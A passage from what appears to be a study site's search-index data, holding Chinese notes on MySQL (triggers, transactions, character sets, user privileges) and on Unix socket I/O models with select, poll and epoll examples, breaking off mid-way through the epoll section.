\u89E6\u53D1\u5668\u5FC5\u987B\u6307\u5B9A\u5728\u8BED\u53E5\u6267\u884C\u4E4B\u524D\u8FD8\u662F\u4E4B\u540E\u81EA\u52A8\u6267\u884C\uFF0C\u4E4B\u524D\u6267\u884C\u4F7F\u7528 BEFORE \u5173\u952E\u5B57\uFF0C\u4E4B\u540E\u6267\u884C\u4F7F\u7528 AFTER \u5173\u952E\u5B57\u3002BEFORE \u7528\u4E8E\u6570\u636E\u9A8C\u8BC1\u548C\u51C0\u5316\uFF0CAFTER \u7528\u4E8E\u5BA1\u8BA1\u8DDF\u8E2A\uFF0C\u5C06\u4FEE\u6539\u8BB0\u5F55\u5230\u53E6\u5916\u4E00\u5F20\u8868\u4E2D\u3002
INSERT \u89E6\u53D1\u5668\u5305\u542B\u4E00\u4E2A\u540D\u4E3A NEW \u7684\u865A\u62DF\u8868\u3002
CREATE TRIGGER mytrigger AFTER INSERT ON mytable
FOR EACH ROW SELECT NEW.col into @result; SELECT @result; -- \u83B7\u53D6\u7ED3\u679C
DELETE \u89E6\u53D1\u5668\u5305\u542B\u4E00\u4E2A\u540D\u4E3A OLD \u7684\u865A\u62DF\u8868\uFF0C\u5E76\u4E14\u662F\u53EA\u8BFB\u7684\u3002
UPDATE \u89E6\u53D1\u5668\u5305\u542B\u4E00\u4E2A\u540D\u4E3A NEW \u548C\u4E00\u4E2A\u540D\u4E3A OLD \u7684\u865A\u62DF\u8868\uFF0C\u5176\u4E2D NEW \u662F\u53EF\u4EE5\u88AB\u4FEE\u6539\u7684\uFF0C\u800C OLD \u662F\u53EA\u8BFB\u7684\u3002
MySQL \u4E0D\u5141\u8BB8\u5728\u89E6\u53D1\u5668\u4E2D\u4F7F\u7528 CALL \u8BED\u53E5\uFF0C\u4E5F\u5C31\u662F\u4E0D\u80FD\u8C03\u7528\u5B58\u50A8\u8FC7\u7A0B\u3002`},{header:"\u4E8C\u5341\u4E00\u3001\u4E8B\u52A1\u7BA1\u7406",slug:"\u4E8C\u5341\u4E00\u3001\u4E8B\u52A1\u7BA1\u7406",content:`\u57FA\u672C\u672F\u8BED\uFF1A \u4E8B\u52A1\uFF08transaction\uFF09\u6307\u4E00\u7EC4 SQL \u8BED\u53E5\uFF1B
\u56DE\u9000\uFF08rollback\uFF09\u6307\u64A4\u9500\u6307\u5B9A SQL \u8BED\u53E5\u7684\u8FC7\u7A0B\uFF1B
\u63D0\u4EA4\uFF08commit\uFF09\u6307\u5C06\u672A\u5B58\u50A8\u7684 SQL \u8BED\u53E5\u7ED3\u679C\u5199\u5165\u6570\u636E\u5E93\u8868\uFF1B
\u4FDD\u7559\u70B9\uFF08savepoint\uFF09\u6307\u4E8B\u52A1\u5904\u7406\u4E2D\u8BBE\u7F6E\u7684\u4E34\u65F6\u5360\u4F4D\u7B26\uFF08placeholder\uFF09\uFF0C\u4F60\u53EF\u4EE5\u5BF9\u5B83\u53D1\u5E03\u56DE\u9000\uFF08\u4E0E\u56DE\u9000\u6574\u4E2A\u4E8B\u52A1\u5904\u7406\u4E0D\u540C\uFF09\u3002 \u4E0D\u80FD\u56DE\u9000 SELECT \u8BED\u53E5\uFF0C\u56DE\u9000 SELECT \u8BED\u53E5\u4E5F\u6CA1\u610F\u4E49\uFF1B\u4E5F\u4E0D\u80FD\u56DE\u9000 CREATE \u548C DROP \u8BED\u53E5\u3002
MySQL \u7684\u4E8B\u52A1\u63D0\u4EA4\u9ED8\u8BA4\u662F\u9690\u5F0F\u63D0\u4EA4\uFF0C\u6BCF\u6267\u884C\u4E00\u6761\u8BED\u53E5\u5C31\u628A\u8FD9\u6761\u8BED\u53E5\u5F53\u6210\u4E00\u4E2A\u4E8B\u52A1\u7136\u540E\u8FDB\u884C\u63D0\u4EA4\u3002\u5F53\u51FA\u73B0 START TRANSACTION \u8BED\u53E5\u65F6\uFF0C\u4F1A\u5173\u95ED\u9690\u5F0F\u63D0\u4EA4\uFF1B\u5F53 COMMIT \u6216 ROLLBACK \u8BED\u53E5\u6267\u884C\u540E\uFF0C\u4E8B\u52A1\u4F1A\u81EA\u52A8\u5173\u95ED\uFF0C\u91CD\u65B0\u6062\u590D\u9690\u5F0F\u63D0\u4EA4\u3002
\u8BBE\u7F6E autocommit \u4E3A 0 \u53EF\u4EE5\u53D6\u6D88\u81EA\u52A8\u63D0\u4EA4\uFF1Bautocommit \u6807\u8BB0\u662F\u9488\u5BF9\u6BCF\u4E2A\u8FDE\u63A5\u800C\u4E0D\u662F\u9488\u5BF9\u670D\u52A1\u5668\u7684\u3002
\u5982\u679C\u6CA1\u6709\u8BBE\u7F6E\u4FDD\u7559\u70B9\uFF0CROLLBACK \u4F1A\u56DE\u9000\u5230 START TRANSACTION \u8BED\u53E5\u5904\uFF1B\u5982\u679C\u8BBE\u7F6E\u4E86\u4FDD\u7559\u70B9\uFF0C\u5E76\u4E14\u5728 ROLLBACK \u4E2D\u6307\u5B9A\u8BE5\u4FDD\u7559\u70B9\uFF0C\u5219\u4F1A\u56DE\u9000\u5230\u8BE5\u4FDD\u7559\u70B9\u3002
START TRANSACTION
// ...
SAVEPOINT delete1
// ...
ROLLBACK TO delete1
// ...
COMMIT`},{header:"\u4E8C\u5341\u4E8C\u3001\u5B57\u7B26\u96C6",slug:"\u4E8C\u5341\u4E8C\u3001\u5B57\u7B26\u96C6",content:`\u57FA\u672C\u672F\u8BED\uFF1A \u5B57\u7B26\u96C6\u4E3A\u5B57\u6BCD\u548C\u7B26\u53F7\u7684\u96C6\u5408\uFF1B
\u7F16\u7801\u4E3A\u67D0\u4E2A\u5B57\u7B26\u96C6\u6210\u5458\u7684\u5185\u90E8\u8868\u793A\uFF1B
\u6821\u5BF9\u5B57\u7B26\u6307\u5B9A\u5982\u4F55\u6BD4\u8F83\uFF0C\u4E3B\u8981\u7528\u4E8E\u6392\u5E8F\u548C\u5206\u7EC4\u3002 \u9664\u4E86\u7ED9\u8868\u6307\u5B9A\u5B57\u7B26\u96C6\u548C\u6821\u5BF9\u5916\uFF0C\u4E5F\u53EF\u4EE5\u7ED9\u5217\u6307\u5B9A\uFF1A
CREATE TABLE mytable
(col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci )
DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci;
\u53EF\u4EE5\u5728\u6392\u5E8F\u3001\u5206\u7EC4\u65F6\u6307\u5B9A\u6821\u5BF9\uFF1A
SELECT *
FROM mytable
ORDER BY col COLLATE latin1_general_ci;`},{header:"\u4E8C\u5341\u4E09\u3001\u6743\u9650\u7BA1\u7406",slug:"\u4E8C\u5341\u4E09\u3001\u6743\u9650\u7BA1\u7406",content:`MySQL \u7684\u8D26\u6237\u4FE1\u606F\u4FDD\u5B58\u5728 mysql \u8FD9\u4E2A\u6570\u636E\u5E93\u4E2D\u3002
USE mysql;
SELECT user FROM user;
\u521B\u5EFA\u8D26\u6237
\u65B0\u521B\u5EFA\u7684\u8D26\u6237\u6CA1\u6709\u4EFB\u4F55\u6743\u9650\u3002
CREATE USER myuser IDENTIFIED BY 'mypassword';
\u4FEE\u6539\u8D26\u6237\u540D
RENAME USER myuser TO newuser;
\u5220\u9664\u8D26\u6237
DROP USER myuser;
\u67E5\u770B\u6743\u9650
SHOW GRANTS FOR myuser;
\u6388\u4E88\u6743\u9650
\u8D26\u6237\u7528 username@host \u7684\u5F62\u5F0F\u5B9A\u4E49\uFF0Cusername@% \u4F7F\u7528\u7684\u662F\u9ED8\u8BA4\u4E3B\u673A\u540D\u3002
GRANT SELECT, INSERT ON mydatabase.* TO myuser;
\u5220\u9664\u6743\u9650
GRANT \u548C REVOKE \u53EF\u5728\u51E0\u4E2A\u5C42\u6B21\u4E0A\u63A7\u5236\u8BBF\u95EE\u6743\u9650\uFF1A \u6574\u4E2A\u670D\u52A1\u5668\uFF0C\u4F7F\u7528 GRANT ALL \u548C REVOKE ALL\uFF1B
\u6574\u4E2A\u6570\u636E\u5E93\uFF0C\u4F7F\u7528 ON database.*\uFF1B
\u7279\u5B9A\u7684\u8868\uFF0C\u4F7F\u7528 ON database.table\uFF1B
\u7279\u5B9A\u7684\u5217\uFF1B
\u7279\u5B9A\u7684\u5B58\u50A8\u8FC7\u7A0B\u3002 REVOKE SELECT, INSERT ON mydatabase.* FROM myuser;
\u66F4\u6539\u5BC6\u7801
\u5FC5\u987B\u4F7F\u7528 Password() \u51FD\u6570\u8FDB\u884C\u52A0\u5BC6\u3002
SET PASSWROD FOR myuser = Password('new_password');`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:"BenForta. SQL \u5FC5\u77E5\u5FC5\u4F1A [M]. \u4EBA\u6C11\u90AE\u7535\u51FA\u7248\u793E, 2013."}]},{path:"/java/Socket.html",title:"Socket",pathLocale:"/",contents:[{header:"Socket",slug:"socket",content:`Socket \u4E00\u3001I/O \u6A21\u578B \u963B\u585E\u5F0F I/O
\u975E\u963B\u585E\u5F0F I/O
I/O \u590D\u7528
\u4FE1\u53F7\u9A71\u52A8 I/O
\u5F02\u6B65 I/O
\u4E94\u5927 I/O \u6A21\u578B\u6BD4\u8F83 \u4E8C\u3001I/O \u590D\u7528 select
poll
\u6BD4\u8F83
epoll
\u5DE5\u4F5C\u6A21\u5F0F
\u5E94\u7528\u573A\u666F \u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001I/O \u6A21\u578B",slug:"\u4E00\u3001i-o-\u6A21\u578B",content:`\u4E00\u4E2A\u8F93\u5165\u64CD\u4F5C\u901A\u5E38\u5305\u62EC\u4E24\u4E2A\u9636\u6BB5\uFF1A \u7B49\u5F85\u6570\u636E\u51C6\u5907\u597D
\u4ECE\u5185\u6838\u5411\u8FDB\u7A0B\u590D\u5236\u6570\u636E \u5BF9\u4E8E\u4E00\u4E2A\u5957\u63A5\u5B57\u4E0A\u7684\u8F93\u5165\u64CD\u4F5C\uFF0C\u7B2C\u4E00\u6B65\u901A\u5E38\u6D89\u53CA\u7B49\u5F85\u6570\u636E\u4ECE\u7F51\u7EDC\u4E2D\u5230\u8FBE\u3002\u5F53\u6240\u7B49\u5F85\u6570\u636E\u5230\u8FBE\u65F6\uFF0C\u5B83\u88AB\u590D\u5236\u5230\u5185\u6838\u4E2D\u7684\u67D0\u4E2A\u7F13\u51B2\u533A\u3002\u7B2C\u4E8C\u6B65\u5C31\u662F\u628A\u6570\u636E\u4ECE\u5185\u6838\u7F13\u51B2\u533A\u590D\u5236\u5230\u5E94\u7528\u8FDB\u7A0B\u7F13\u51B2\u533A\u3002
Unix \u6709\u4E94\u79CD I/O \u6A21\u578B\uFF1A \u963B\u585E\u5F0F I/O
\u975E\u963B\u585E\u5F0F I/O
I/O \u590D\u7528\uFF08select \u548C poll\uFF09
\u4FE1\u53F7\u9A71\u52A8\u5F0F I/O\uFF08SIGIO\uFF09
\u5F02\u6B65 I/O\uFF08AIO\uFF09`},{header:"\u963B\u585E\u5F0F I/O",slug:"\u963B\u585E\u5F0F-i-o",content:`\u5E94\u7528\u8FDB\u7A0B\u88AB\u963B\u585E\uFF0C\u76F4\u5230\u6570\u636E\u4ECE\u5185\u6838\u7F13\u51B2\u533A\u590D\u5236\u5230\u5E94\u7528\u8FDB\u7A0B\u7F13\u51B2\u533A\u4E2D\u624D\u8FD4\u56DE\u3002
\u5E94\u8BE5\u6CE8\u610F\u5230\uFF0C\u5728\u963B\u585E\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u5176\u5B83\u5E94\u7528\u8FDB\u7A0B\u8FD8\u53EF\u4EE5\u6267\u884C\uFF0C\u56E0\u6B64\u963B\u585E\u4E0D\u610F\u5473\u7740\u6574\u4E2A\u64CD\u4F5C\u7CFB\u7EDF\u90FD\u88AB\u963B\u585E\u3002\u56E0\u4E3A\u5176\u5B83\u5E94\u7528\u8FDB\u7A0B\u8FD8\u53EF\u4EE5\u6267\u884C\uFF0C\u6240\u4EE5\u4E0D\u6D88\u8017 CPU \u65F6\u95F4\uFF0C\u8FD9\u79CD\u6A21\u578B\u7684 CPU \u5229\u7528\u7387\u4F1A\u6BD4\u8F83\u9AD8\u3002
\u4E0B\u56FE\u4E2D\uFF0Crecvfrom() \u7528\u4E8E\u63A5\u6536 Socket \u4F20\u6765\u7684\u6570\u636E\uFF0C\u5E76\u590D\u5236\u5230\u5E94\u7528\u8FDB\u7A0B\u7684\u7F13\u51B2\u533A buf \u4E2D\u3002\u8FD9\u91CC\u628A recvfrom() \u5F53\u6210\u7CFB\u7EDF\u8C03\u7528\u3002
ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);`},{header:"\u975E\u963B\u585E\u5F0F I/O",slug:"\u975E\u963B\u585E\u5F0F-i-o",content:`\u5E94\u7528\u8FDB\u7A0B\u6267\u884C\u7CFB\u7EDF\u8C03\u7528\u4E4B\u540E\uFF0C\u5185\u6838\u8FD4\u56DE\u4E00\u4E2A\u9519\u8BEF\u7801\u3002\u5E94\u7528\u8FDB\u7A0B\u53EF\u4EE5\u7EE7\u7EED\u6267\u884C\uFF0C\u4F46\u662F\u9700\u8981\u4E0D\u65AD\u7684\u6267\u884C\u7CFB\u7EDF\u8C03\u7528\u6765\u83B7\u77E5 I/O \u662F\u5426\u5B8C\u6210\uFF0C\u8FD9\u79CD\u65B9\u5F0F\u79F0\u4E3A\u8F6E\u8BE2\uFF08polling\uFF09\u3002
\u7531\u4E8E CPU \u8981\u5904\u7406\u66F4\u591A\u7684\u7CFB\u7EDF\u8C03\u7528\uFF0C\u56E0\u6B64\u8FD9\u79CD\u6A21\u578B\u7684 CPU \u5229\u7528\u7387\u6BD4\u8F83\u4F4E\u3002`},{header:"I/O \u590D\u7528",slug:"i-o-\u590D\u7528",content:`\u4F7F\u7528 select \u6216\u8005 poll \u7B49\u5F85\u6570\u636E\uFF0C\u5E76\u4E14\u53EF\u4EE5\u7B49\u5F85\u591A\u4E2A\u5957\u63A5\u5B57\u4E2D\u7684\u4EFB\u4F55\u4E00\u4E2A\u53D8\u4E3A\u53EF\u8BFB\u3002\u8FD9\u4E00\u8FC7\u7A0B\u4F1A\u88AB\u963B\u585E\uFF0C\u5F53\u67D0\u4E00\u4E2A\u5957\u63A5\u5B57\u53EF\u8BFB\u65F6\u8FD4\u56DE\uFF0C\u4E4B\u540E\u518D\u4F7F\u7528 recvfrom \u628A\u6570\u636E\u4ECE\u5185\u6838\u590D\u5236\u5230\u8FDB\u7A0B\u4E2D\u3002
\u5B83\u53EF\u4EE5\u8BA9\u5355\u4E2A\u8FDB\u7A0B\u5177\u6709\u5904\u7406\u591A\u4E2A I/O \u4E8B\u4EF6\u7684\u80FD\u529B\u3002\u53C8\u88AB\u79F0\u4E3A Event Driven I/O\uFF0C\u5373\u4E8B\u4EF6\u9A71\u52A8 I/O\u3002
\u5982\u679C\u4E00\u4E2A Web \u670D\u52A1\u5668\u6CA1\u6709 I/O \u590D\u7528\uFF0C\u90A3\u4E48\u6BCF\u4E00\u4E2A Socket \u8FDE\u63A5\u90FD\u9700\u8981\u521B\u5EFA\u4E00\u4E2A\u7EBF\u7A0B\u53BB\u5904\u7406\u3002\u5982\u679C\u540C\u65F6\u6709\u51E0\u4E07\u4E2A\u8FDE\u63A5\uFF0C\u90A3\u4E48\u5C31\u9700\u8981\u521B\u5EFA\u76F8\u540C\u6570\u91CF\u7684\u7EBF\u7A0B\u3002\u76F8\u6BD4\u4E8E\u591A\u8FDB\u7A0B\u548C\u591A\u7EBF\u7A0B\u6280\u672F\uFF0CI/O \u590D\u7528\u4E0D\u9700\u8981\u8FDB\u7A0B\u7EBF\u7A0B\u521B\u5EFA\u548C\u5207\u6362\u7684\u5F00\u9500\uFF0C\u7CFB\u7EDF\u5F00\u9500\u66F4\u5C0F\u3002`},{header:"\u4FE1\u53F7\u9A71\u52A8 I/O",slug:"\u4FE1\u53F7\u9A71\u52A8-i-o",content:`\u5E94\u7528\u8FDB\u7A0B\u4F7F\u7528 sigaction \u7CFB\u7EDF\u8C03\u7528\uFF0C\u5185\u6838\u7ACB\u5373\u8FD4\u56DE\uFF0C\u5E94\u7528\u8FDB\u7A0B\u53EF\u4EE5\u7EE7\u7EED\u6267\u884C\uFF0C\u4E5F\u5C31\u662F\u8BF4\u7B49\u5F85\u6570\u636E\u9636\u6BB5\u5E94\u7528\u8FDB\u7A0B\u662F\u975E\u963B\u585E\u7684\u3002\u5185\u6838\u5728\u6570\u636E\u5230\u8FBE\u65F6\u5411\u5E94\u7528\u8FDB\u7A0B\u53D1\u9001 SIGIO \u4FE1\u53F7\uFF0C\u5E94\u7528\u8FDB\u7A0B\u6536\u5230\u4E4B\u540E\u5728\u4FE1\u53F7\u5904\u7406\u7A0B\u5E8F\u4E2D\u8C03\u7528 recvfrom \u5C06\u6570\u636E\u4ECE\u5185\u6838\u590D\u5236\u5230\u5E94\u7528\u8FDB\u7A0B\u4E2D\u3002
\u76F8\u6BD4\u4E8E\u975E\u963B\u585E\u5F0F I/O \u7684\u8F6E\u8BE2\u65B9\u5F0F\uFF0C\u4FE1\u53F7\u9A71\u52A8 I/O \u7684 CPU \u5229\u7528\u7387\u66F4\u9AD8\u3002`},{header:"\u5F02\u6B65 I/O",slug:"\u5F02\u6B65-i-o",content:`\u5E94\u7528\u8FDB\u7A0B\u6267\u884C aio_read \u7CFB\u7EDF\u8C03\u7528\u4F1A\u7ACB\u5373\u8FD4\u56DE\uFF0C\u5E94\u7528\u8FDB\u7A0B\u53EF\u4EE5\u7EE7\u7EED\u6267\u884C\uFF0C\u4E0D\u4F1A\u88AB\u963B\u585E\uFF0C\u5185\u6838\u4F1A\u5728\u6240\u6709\u64CD\u4F5C\u5B8C\u6210\u4E4B\u540E\u5411\u5E94\u7528\u8FDB\u7A0B\u53D1\u9001\u4FE1\u53F7\u3002
\u5F02\u6B65 I/O \u4E0E\u4FE1\u53F7\u9A71\u52A8 I/O \u7684\u533A\u522B\u5728\u4E8E\uFF0C\u5F02\u6B65 I/O \u7684\u4FE1\u53F7\u662F\u901A\u77E5\u5E94\u7528\u8FDB\u7A0B I/O \u5B8C\u6210\uFF0C\u800C\u4FE1\u53F7\u9A71\u52A8 I/O \u7684\u4FE1\u53F7\u662F\u901A\u77E5\u5E94\u7528\u8FDB\u7A0B\u53EF\u4EE5\u5F00\u59CB I/O\u3002`},{header:"\u4E94\u5927 I/O \u6A21\u578B\u6BD4\u8F83",slug:"\u4E94\u5927-i-o-\u6A21\u578B\u6BD4\u8F83",content:`\u540C\u6B65 I/O\uFF1A\u5C06\u6570\u636E\u4ECE\u5185\u6838\u7F13\u51B2\u533A\u590D\u5236\u5230\u5E94\u7528\u8FDB\u7A0B\u7F13\u51B2\u533A\u7684\u9636\u6BB5\uFF08\u7B2C\u4E8C\u9636\u6BB5\uFF09\uFF0C\u5E94\u7528\u8FDB\u7A0B\u4F1A\u963B\u585E\u3002
\u5F02\u6B65 I/O\uFF1A\u7B2C\u4E8C\u9636\u6BB5\u5E94\u7528\u8FDB\u7A0B\u4E0D\u4F1A\u963B\u585E\u3002 \u540C\u6B65 I/O \u5305\u62EC\u963B\u585E\u5F0F I/O\u3001\u975E\u963B\u585E\u5F0F I/O\u3001I/O \u590D\u7528\u548C\u4FE1\u53F7\u9A71\u52A8 I/O \uFF0C\u5B83\u4EEC\u7684\u4E3B\u8981\u533A\u522B\u5728\u7B2C\u4E00\u4E2A\u9636\u6BB5\u3002
\u975E\u963B\u585E\u5F0F I/O \u3001\u4FE1\u53F7\u9A71\u52A8 I/O \u548C\u5F02\u6B65 I/O \u5728\u7B2C\u4E00\u9636\u6BB5\u4E0D\u4F1A\u963B\u585E\u3002`},{header:"\u4E8C\u3001I/O \u590D\u7528",slug:"\u4E8C\u3001i-o-\u590D\u7528",content:"select/poll/epoll \u90FD\u662F I/O \u591A\u8DEF\u590D\u7528\u7684\u5177\u4F53\u5B9E\u73B0\uFF0Cselect \u51FA\u73B0\u7684\u6700\u65E9\uFF0C\u4E4B\u540E\u662F poll\uFF0C\u518D\u662F epoll\u3002"},{header:"select",slug:"select",content:`int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);
select \u5141\u8BB8\u5E94\u7528\u7A0B\u5E8F\u76D1\u89C6\u4E00\u7EC4\u6587\u4EF6\u63CF\u8FF0\u7B26\uFF0C\u7B49\u5F85\u4E00\u4E2A\u6216\u8005\u591A\u4E2A\u63CF\u8FF0\u7B26\u6210\u4E3A\u5C31\u7EEA\u72B6\u6001\uFF0C\u4ECE\u800C\u5B8C\u6210 I/O \u64CD\u4F5C\u3002 fd_set \u4F7F\u7528\u6570\u7EC4\u5B9E\u73B0\uFF0C\u6570\u7EC4\u5927\u5C0F\u4F7F\u7528 FD_SETSIZE \u5B9A\u4E49\uFF0C\u6240\u4EE5\u53EA\u80FD\u76D1\u542C\u5C11\u4E8E FD_SETSIZE \u6570\u91CF\u7684\u63CF\u8FF0\u7B26\u3002\u6709\u4E09\u79CD\u7C7B\u578B\u7684\u63CF\u8FF0\u7B26\u7C7B\u578B\uFF1Areadset\u3001writeset\u3001exceptset\uFF0C\u5206\u522B\u5BF9\u5E94\u8BFB\u3001\u5199\u3001\u5F02\u5E38\u6761\u4EF6\u7684\u63CF\u8FF0\u7B26\u96C6\u5408\u3002 timeout \u4E3A\u8D85\u65F6\u53C2\u6570\uFF0C\u8C03\u7528 select \u4F1A\u4E00\u76F4\u963B\u585E\u76F4\u5230\u6709\u63CF\u8FF0\u7B26\u7684\u4E8B\u4EF6\u5230\u8FBE\u6216\u8005\u7B49\u5F85\u7684\u65F6\u95F4\u8D85\u8FC7 timeout\u3002 \u6210\u529F\u8C03\u7528\u8FD4\u56DE\u7ED3\u679C\u5927\u4E8E 0\uFF0C\u51FA\u9519\u8FD4\u56DE\u7ED3\u679C\u4E3A -1\uFF0C\u8D85\u65F6\u8FD4\u56DE\u7ED3\u679C\u4E3A 0\u3002 fd_set fd_in, fd_out;
struct timeval tv; // Reset the sets
FD_ZERO( &fd_in );
FD_ZERO( &fd_out ); // Monitor sock1 for input events
FD_SET( sock1, &fd_in ); // Monitor sock2 for output events
FD_SET( sock2, &fd_out ); // Find out which socket has the largest numeric value as select requires it
int largest_sock = sock1 > sock2 ? sock1 : sock2; // Wait up to 10 seconds
tv.tv_sec = 10;
tv.tv_usec = 0; // Call the select
int ret = select( largest_sock + 1, &fd_in, &fd_out, NULL, &tv ); // Check if select actually succeed
if ( ret == -1 ) // report error and abort
else if ( ret == 0 ) // timeout; no event detected
else
{ if ( FD_ISSET( sock1, &fd_in ) ) // input event on sock1 if ( FD_ISSET( sock2, &fd_out ) ) // output event on sock2
}`},{header:"poll",slug:"poll",content:`int poll(struct pollfd *fds, unsigned int nfds, int timeout);
poll \u7684\u529F\u80FD\u4E0E select \u7C7B\u4F3C\uFF0C\u4E5F\u662F\u7B49\u5F85\u4E00\u7EC4\u63CF\u8FF0\u7B26\u4E2D\u7684\u4E00\u4E2A\u6210\u4E3A\u5C31\u7EEA\u72B6\u6001\u3002
poll \u4E2D\u7684\u63CF\u8FF0\u7B26\u662F pollfd \u7C7B\u578B\u7684\u6570\u7EC4\uFF0Cpollfd \u7684\u5B9A\u4E49\u5982\u4E0B\uFF1A
struct pollfd { int fd; /* file descriptor */ short events; /* requested events */ short revents; /* returned events */ };
// The structure for two events
struct pollfd fds[2]; // Monitor sock1 for input
fds[0].fd = sock1;
fds[0].events = POLLIN; // Monitor sock2 for output
fds[1].fd = sock2;
fds[1].events = POLLOUT; // Wait 10 seconds
int ret = poll( &fds, 2, 10000 );
// Check if poll actually succeed
if ( ret == -1 ) // report error and abort
else if ( ret == 0 ) // timeout; no event detected
else
{ // If we detect the event, zero it out so we can reuse the structure if ( fds[0].revents & POLLIN ) fds[0].revents = 0; // input event on sock1 if ( fds[1].revents & POLLOUT ) fds[1].revents = 0; // output event on sock2
}`},{header:"\u6BD4\u8F83",slug:"\u6BD4\u8F83",content:""},{header:"1. \u529F\u80FD",slug:"_1-\u529F\u80FD",content:`select \u548C poll \u7684\u529F\u80FD\u57FA\u672C\u76F8\u540C\uFF0C\u4E0D\u8FC7\u5728\u4E00\u4E9B\u5B9E\u73B0\u7EC6\u8282\u4E0A\u6709\u6240\u4E0D\u540C\u3002 select \u4F1A\u4FEE\u6539\u63CF\u8FF0\u7B26\uFF0C\u800C poll \u4E0D\u4F1A\uFF1B
select \u7684\u63CF\u8FF0\u7B26\u7C7B\u578B\u4F7F\u7528\u6570\u7EC4\u5B9E\u73B0\uFF0CFD_SETSIZE \u5927\u5C0F\u9ED8\u8BA4\u4E3A 1024\uFF0C\u56E0\u6B64\u9ED8\u8BA4\u53EA\u80FD\u76D1\u542C\u5C11\u4E8E 1024 \u4E2A\u63CF\u8FF0\u7B26\u3002\u5982\u679C\u8981\u76D1\u542C\u66F4\u591A\u63CF\u8FF0\u7B26\u7684\u8BDD\uFF0C\u9700\u8981\u4FEE\u6539 FD_SETSIZE \u4E4B\u540E\u91CD\u65B0\u7F16\u8BD1\uFF1B\u800C poll \u6CA1\u6709\u63CF\u8FF0\u7B26\u6570\u91CF\u7684\u9650\u5236\uFF1B
poll \u63D0\u4F9B\u4E86\u66F4\u591A\u7684\u4E8B\u4EF6\u7C7B\u578B\uFF0C\u5E76\u4E14\u5BF9\u63CF\u8FF0\u7B26\u7684\u91CD\u590D\u5229\u7528\u4E0A\u6BD4 select \u9AD8\u3002
\u5982\u679C\u4E00\u4E2A\u7EBF\u7A0B\u5BF9\u67D0\u4E2A\u63CF\u8FF0\u7B26\u8C03\u7528\u4E86 select \u6216\u8005 poll\uFF0C\u53E6\u4E00\u4E2A\u7EBF\u7A0B\u5173\u95ED\u4E86\u8BE5\u63CF\u8FF0\u7B26\uFF0C\u4F1A\u5BFC\u81F4\u8C03\u7528\u7ED3\u679C\u4E0D\u786E\u5B9A\u3002`},{header:"2. \u901F\u5EA6",slug:"_2-\u901F\u5EA6",content:"select \u548C poll \u901F\u5EA6\u90FD\u6BD4\u8F83\u6162\uFF0C\u6BCF\u6B21\u8C03\u7528\u90FD\u9700\u8981\u5C06\u5168\u90E8\u63CF\u8FF0\u7B26\u4ECE\u5E94\u7528\u8FDB\u7A0B\u7F13\u51B2\u533A\u590D\u5236\u5230\u5185\u6838\u7F13\u51B2\u533A\u3002"},{header:"3. \u53EF\u79FB\u690D\u6027",slug:"_3-\u53EF\u79FB\u690D\u6027",content:"\u51E0\u4E4E\u6240\u6709\u7684\u7CFB\u7EDF\u90FD\u652F\u6301 select\uFF0C\u4F46\u662F\u53EA\u6709\u6BD4\u8F83\u65B0\u7684\u7CFB\u7EDF\u652F\u6301 poll\u3002"},{header:"epoll",slug:"epoll",content:`int epoll_create(int size);
int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)\uFF1B
int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);
epoll_ctl() \u7528\u4E8E\u5411\u5185\u6838\u6CE8\u518C\u65B0\u7684\u63CF\u8FF0\u7B26\u6216\u8005\u662F\u6539\u53D8\u67D0\u4E2A\u6587\u4EF6\u63CF\u8FF0\u7B26\u7684\u72B6\u6001\u3002\u5DF2\u6CE8\u518C\u7684\u63CF\u8FF0\u7B26\u5728\u5185\u6838\u4E2D\u4F1A\u88AB\u7EF4\u62A4\u5728\u4E00\u68F5\u7EA2\u9ED1\u6811\u4E0A\uFF0C\u901A\u8FC7\u56DE\u8C03\u51FD\u6570\u5185\u6838\u4F1A\u5C06 I/O \u51C6\u5907\u597D\u7684\u63CF\u8FF0\u7B26\u52A0\u5165\u5230\u4E00\u4E2A\u94FE\u8868\u4E2D\u7BA1\u7406\uFF0C\u8FDB\u7A0B\u8C03\u7528 epoll_wait() \u4FBF\u53EF\u4EE5\u5F97\u5230\u4E8B\u4EF6\u5B8C\u6210\u7684\u63CF\u8FF0\u7B26\u3002
\u4ECE\u4E0A\u9762\u7684\u63CF\u8FF0\u53EF\u4EE5\u770B\u51FA\uFF0Cepoll \u53EA\u9700\u8981\u5C06\u63CF\u8FF0\u7B26\u4ECE\u8FDB\u7A0B\u7F13\u51B2\u533A\u5411\u5185\u6838\u7F13\u51B2\u533A\u62F7\u8D1D\u4E00\u6B21\uFF0C\u5E76\u4E14\u8FDB\u7A0B\u4E0D\u9700\u8981\u901A\u8FC7\u8F6E\u8BE2\u6765\u83B7\u5F97\u4E8B\u4EF6\u5B8C\u6210\u7684\u63CF\u8FF0\u7B26\u3002
epoll \u4EC5\u9002\u7528\u4E8E Linux OS\u3002
epoll \u6BD4 select \u548C poll \u66F4\u52A0\u7075\u6D3B\u800C\u4E14\u6CA1\u6709\u63CF\u8FF0\u7B26\u6570\u91CF\u9650\u5236\u3002
epoll \u5BF9\u591A\u7EBF\u7A0B\u7F16\u7A0B\u66F4\u6709\u53CB\u597D\uFF0C\u4E00\u4E2A\u7EBF\u7A0B\u8C03\u7528\u4E86 epoll_wait() \u53E6\u4E00\u4E2A\u7EBF\u7A0B\u5173\u95ED\u4E86\u540C\u4E00\u4E2A\u63CF\u8FF0\u7B26\u4E5F\u4E0D\u4F1A\u4EA7\u751F\u50CF select \u548C poll \u7684\u4E0D\u786E\u5B9A\u60C5\u51B5\u3002
// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.
// The function argument is ignored (it was not before, but now it is), so put your favorite number here
int pollingfd = epoll_create( 0xCAFE ); if ( pollingfd < 0 ) // report error // Initialize the epoll structure in case more members are added in future
struct epoll_event ev = { 0 }; // Associate the connection class instance with the event. You can associate anything
// you want, epoll does not use this information. We store a connection class pointer, pConnection1
ev.data.ptr = pConnection1; // Monitor for input, and do not automatically rearm the descriptor after the event
